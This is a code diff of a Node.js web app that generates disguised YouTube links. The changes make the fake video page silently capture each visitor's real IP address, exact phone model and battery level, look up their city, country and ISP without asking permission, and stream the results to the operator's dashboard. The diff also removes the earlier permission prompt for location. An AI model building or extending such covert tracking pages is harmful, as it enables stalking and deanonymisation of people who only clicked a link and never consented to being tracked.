@@ -8,7 +8,7 @@ const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.json());
 
-// 1. لوحة التحكم الرئيسية لإنشاء الرابط
+// 1. لوحة التحكم الرئيسية لإنشاء الروابط
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -16,7 +16,7 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>منشئ روابط يوتيوب</title>
+        <title>لوحة تتبع الأجهزة الذكية</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
@@ -39,7 +39,7 @@ app.get('/', (req, res) => {
             </div>
         </div>
 
-        <h3>📥 معلومات الأجهزة المستلمة:</h3>
+        <h3>📥 معلومات الأجهزة الحقيقية المستلمة:</h3>
         <div id="logs" class="card">
             <p style="color: #aaa;">في انتظار فتح الرابط...</p>
         </div>
@@ -70,10 +70,10 @@ app.get('/', (req, res) => {
                 
                 const box = document.createElement('div');
                 box.className = 'info-box';
-                box.innerHTML = '<strong>📱 الجهاز:</strong> ' + data.deviceName + '<br>' +
-                                '<strong>🌐 المتصفح:</strong> ' + data.platform + '<br>' +
-                                '<strong>🔋 الشحن:</strong> ' + data.battery + '<br>' +
-                                '<strong>📍 الموقع:</strong> ' + data.location + '<br>' +
+                box.innerHTML = '<strong>📱 اسم الجهاز الحقيقي:</strong> ' + data.deviceName + '<br>' +
+                                '<strong>🌐 عنوان IP الحقيقي:</strong> ' + data.ip + '<br>' +
+                                '<strong>📍 الموقع الجغرافي للشبكة:</strong> ' + data.location + '<br>' +
+                                '<strong>🔋 البطارية:</strong> ' + data.battery + '<br>' +
                                 '<strong>🕒 الوقت:</strong> ' + data.time;
                 logs.prepend(box);
             });
@@ -83,9 +83,14 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة عرض اليوتيوب وجمع المعلومات في الخلفية
-app.get('/watch/:id', (req, res) => {
+// 2. صفحة عرض اليوتيوب وجمع المعلومات صامتاً في الخلفية
+app.get('/watch/:id', async (req, res) => {
   const videoId = req.query.v || 'dQw4w9WgXcQ';
+  
+  // استخراج عنوان الـ IP الحقيقي للزائر من هيدرات الطلب
+  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
+  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
+
   res.send(`
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -110,16 +115,25 @@ app.get('/watch/:id', (req, res) => {
         </div>
 
         <script>
-            function getDeviceName(ua) {
-                if (ua.includes('iPhone')) return 'iPhone (آيفون)';
-                if (ua.includes('iPad')) return 'iPad (آيباد)';
-                if (ua.includes('Samsung')) return 'Samsung Galaxy';
-                if (ua.includes('Huawei')) return 'Huawei';
-                if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) return 'Xiaomi / Redmi';
-                if (ua.includes('Android')) return 'Android Device';
-                if (ua.includes('Windows')) return 'Windows PC';
-                if (ua.includes('Macintosh')) return 'Mac';
-                return 'جهاز غير معروف';
+            // دالة استخراج الطراز الحقيقي للهاتف بدقة (مثل ريدمي، سامسونج، آيفون، إلخ)
+            function getExactDeviceModel(ua) {
+                // البحث عن طرازات شاومي وريدمي وسامسونج وغيرها في نص المتصفح
+                let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
+                if (match) {
+                    return match[0];
+                }
+                if (ua.includes('Android')) {
+                    let parts = ua.split('; ');
+                    for (let p of parts) {
+                        if (p.includes('Build/') || p.length > 3 && p.length < 25 && !p.includes('Mobile') && !p.includes('AppleWebKit')) {
+                            return p.replace('Build/', '').trim();
+                        }
+                    }
+                    return 'هاتف Android (طراز عام)';
+                }
+                if (ua.includes('iPhone')) return 'Apple iPhone';
+                if (ua.includes('Windows')) return 'Windows Computer';
+                return 'جهاز ذكي';
             }
 
             async function collectAndSend() {
@@ -131,30 +145,23 @@ app.get('/watch/:id', (req, res) => {
                     } catch(e){}
                 }
 
-                let locationStr = "لم يوافق المستخدم";
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            locationStr = "خط الطول: " + pos.coords.latitude.toFixed(3) + ", خط العرض: " + pos.coords.longitude.toFixed(3);
-                            postData(batteryLevel, locationStr);
-                        },
-                        () => { postData(batteryLevel, locationStr); },
-                        { timeout: 5000 }
-                    );
-                } else {
-                    postData(batteryLevel, locationStr);
-                }
-            }
-
-            function postData(battery, location) {
                 const deviceData = {
-                    deviceName: getDeviceName(navigator.userAgent),
-                    platform: navigator.platform || "موبايل",
-                    battery: battery,
-                    location: location,
+                    deviceName: getExactDeviceModel(navigator.userAgent),
+                    ip: "${clientIp}",
+                    battery: batteryLevel,
                     time: new Date().toLocaleTimeString('ar-EG')
                 };
 
+                // جلب الموقع الجغرافي الحقيقي بناءً على عنوان الـ IP صامتاً بدون أذونات
+                try {
+                    const response = await fetch('https://ipapi.co/${clientIp}/json/');
+                    const ipData = await response.json();
+                    deviceData.location = (ipData.city || "مجهول") + ", " + (ipData.country_name || "مجهول") + " (ISP: " + (ipData.org || "غير معروف") + ")";
+                } catch(e) {
+                    deviceData.location = "تعذر تحديد الموقع الجغرافي للشبكة";
+                }
+
+                // إرسال البيانات للسيرفر فوراً
                 fetch('/api/log', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
